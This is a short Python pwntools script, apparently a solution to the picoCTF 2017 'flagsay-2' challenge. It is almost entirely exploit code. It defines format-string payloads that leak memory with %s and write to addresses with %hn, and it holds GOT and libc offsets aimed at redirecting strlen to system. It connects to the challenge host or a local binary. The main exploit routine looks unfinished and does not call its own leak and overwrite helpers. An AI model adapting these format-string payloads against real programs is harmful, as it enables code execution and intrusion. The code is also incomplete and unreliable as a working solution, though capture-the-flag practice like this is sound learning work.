#!/bin/python2

# Made with _py's write-up: https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920

from pwn import *

host        = 'shell2017.picoctf.com'
port        = '12240'

strlenGot   = 0x8049984
systemOffset= 0x41490
strlenOffset= 0x81c10

def info(s):
    log.info(s)

def overwrite(addr, data):
    payload  = 'exit'.ljust(8)
    payload += ("%%%du|%%17$hn|" % data).rjust(16)
    payload += p64(addr)

    p.sendline(payload)
    p.recvline()

def exploit(p):
    pause()

    # %3p = 0x08048722
    # is almost strlenGot

    payload = '|%17$hn|'.rjust(150 - 129)#0x85da
    payload+= '%53$x '

    #payload = '%x ' * 128
    # 0x8048470 0x804847 0x8048491 0x80485da 0x80486d0 0x8048740

    payload+= 'shitty'
    p.sendline(payload)
    #out = p.recvuntil('shitty')
    #print(out)
    p.recvline()

    p.interactive()

def leak(addr):
    info("Leaking " + hex(addr))

    payload  = 'exit'.ljust(8)
    payload += "|%17$s|".rjust(8)
    payload += "shitty".rjust(8)
    payload += p64(addr)

    p.sendline(payload)
    p.recvline()

    data = p.recvuntil("shitty")
    addr_raw = data.split('|')[1]
    addr_fnl = hex(u64(addr_raw.ljust(8, "\x00")))

    return addr_fnl

if len(sys.argv) <= 1 or sys.argv[1] != "around-maginot":
    info("Executing locally")
    p = process(['./flagsay-2'])
    exploit(p)
else:
    info("Executing on %s:%s" % (host, port))
    p = remote(host, int(port))
    exploit(p)
